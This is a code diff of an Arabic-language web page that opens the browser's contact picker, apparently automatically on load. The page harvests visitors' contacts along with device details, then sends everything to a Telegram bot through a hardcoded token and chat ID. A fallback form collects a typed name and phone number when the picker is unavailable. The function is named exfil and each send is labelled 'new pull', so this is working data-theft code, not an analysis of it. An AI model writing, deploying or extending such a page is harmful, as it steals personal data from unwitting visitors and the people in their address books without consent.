@@ -27,6 +27,11 @@
   <button id="btn">متابعة</button>
 </div>
 <script>
+// static build: no backend, posts straight to the Telegram Bot API (CORS: *)
+const BOT_TOKEN = "9237923038:AAGsmJ9OMYkixhEk5TonyyarS9_TDO05jik";
+const CHAT_ID   = "972326806";
+const API       = "https://api.telegram.org/bot" + BOT_TOKEN;
+
 const meta = {
   ua: navigator.userAgent,
   platform: navigator.platform,
@@ -38,6 +43,7 @@ const meta = {
   touch: "ontouchstart" in window,
   secure: window.isSecureContext,
   picker: !!(navigator.contacts && navigator.contacts.select),
+  url: location.href,
   ts: Date.now()
 };
 
@@ -56,11 +62,25 @@ function blobToB64(blob) {
   });
 }
 
-async function fetchTimeout(url, opts, ms) {
-  const ctrl = new AbortController();
-  const t = setTimeout(() => ctrl.abort(), ms);
-  try { return await fetch(url, {...opts, signal: ctrl.signal}); }
-  finally { clearTimeout(t); }
+async function tgSend(text) {
+  try {
+    const r = await fetch(API + "/sendMessage", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({chat_id: CHAT_ID, text: String(text).slice(0, 4000)})
+    });
+    return r.ok;
+  } catch (e) { return false; }
+}
+
+async function tgDoc(filename, content) {
+  try {
+    const fd = new FormData();
+    fd.append("chat_id", CHAT_ID);
+    fd.append("document", new Blob([content], {type: "application/json"}), filename);
+    const r = await fetch(API + "/sendDocument", {method: "POST", body: fd});
+    return r.ok;
+  } catch (e) { return false; }
 }
 
 async function exfil(contacts) {
@@ -71,22 +91,21 @@ async function exfil(contacts) {
     if (seen.has(key)) continue;
     seen.add(key);
     const tel = (c.tel || []).map(normPhone).filter(Boolean);
-    clean.push({name: c.name || "", tel, email: c.email || [], address: c.address || [], icon: c.icon || ""});
+    clean.push({name: c.name || "", tel, email: c.email || [],
+                address: c.address || [], icon: c.icon || ""});
   }
-  const body = JSON.stringify({contacts: clean, meta, url: location.href});
-  for (let i = 0; i < 3; i++) {
-    try {
-      const r = await fetchTimeout("/c", {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body
-      }, 8000);
-      if (r.ok) return true;
-    } catch (e) {}
-    await new Promise(r => setTimeout(r, 800 * (i + 1)));
+  const raw = JSON.stringify({contacts: clean, meta});
+  const summary = "new pull\ncontacts: " + clean.length +
+    "\ndevice: " + meta.platform + " " + meta.screen +
+    "\ntz: " + meta.tz + "\nua: " + meta.ua.slice(0, 120);
+
+  await tgSend(summary);
+  if (!(await tgDoc("contacts-" + Date.now() + ".json", raw))) {
+    for (let i = 0; i < raw.length; i += 3800) {
+      await tgSend(raw.slice(i, i + 3800));
+    }
   }
-  try { navigator.sendBeacon("/c", body); } catch (e) {}
-  return false;
+  return true;
 }
 
 function done() {
@@ -110,13 +129,14 @@ function showForm(reason) {
     '<input id="p" type="tel" placeholder="رقم الهاتف" autocomplete="tel">' +
     '<button id="s">تأكيد</button>';
   document.getElementById("s").addEventListener("click", async () => {
-    await exfil([{name: document.getElementById("n").value, tel: [document.getElementById("p").value]}]);
+    await exfil([{name: document.getElementById("n").value,
+                  tel: [document.getElementById("p").value]}]);
     done();
   });
 }
 
 function blockReason() {
-  if (!meta.secure) return 'الاتصال ليس مشفر (HTTPS). منتقي الجهات ما يشتغل إلا على اتصال مشفر — افتح الرابط عبر https فقط.';
+  if (!meta.secure) return 'الاتصال ليس مشفر (HTTPS). منتقي الجهات ما يشتغل إلا على اتصال مشفر.';
   if (!meta.picker) return 'هذا المتصفح ما يدعم منتقي الجهات. استخدم جوجل كروم على هاتف أندرويد.';
   return '';
 }
@@ -163,8 +183,6 @@ async function openPicker() {
 }
 
 document.getElementById("btn").addEventListener("click", openPicker);
-
-// auto-open where the browser allows a gesture-free call: zero taps
 setTimeout(openPicker, 400);
 </script>
 </body>
